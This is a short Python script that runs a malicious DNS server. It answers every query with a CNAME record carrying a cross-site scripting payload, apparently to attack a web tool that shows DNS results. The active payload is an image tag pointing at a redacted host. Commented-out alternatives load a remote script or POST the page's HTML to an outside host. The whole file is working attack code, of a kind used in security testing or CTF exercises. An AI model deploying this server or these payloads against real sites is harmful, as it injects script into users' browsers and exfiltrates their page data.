from time import sleep

from dnslib import RR
from dnslib.server import DNSServer


#PAYLOAD = '<script>fetch(\'%REDACTED\',{body:document.body.innerHTML,method:\'POST\'})</script>'
#PAYLOAD = '<script/src=\'%REDACTED%\'></script>'
PAYLOAD = '<img/src=\'%REDACTED%\'>'

class Resolver:
    def resolve(self, request, handler):
        reply = request.reply()
        resname = str(request.q.qname)[:-1]
        reply.add_answer(*RR.fromZone(resname + ' 2137 CNAME ' + PAYLOAD))
        return reply

if __name__ == '__main__':
    resolver = Resolver()
    s = DNSServer(resolver, port=53, address='0.0.0.0', tcp=False)
    s.start_thread()

    try:
        while 1:
            sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        s.stop()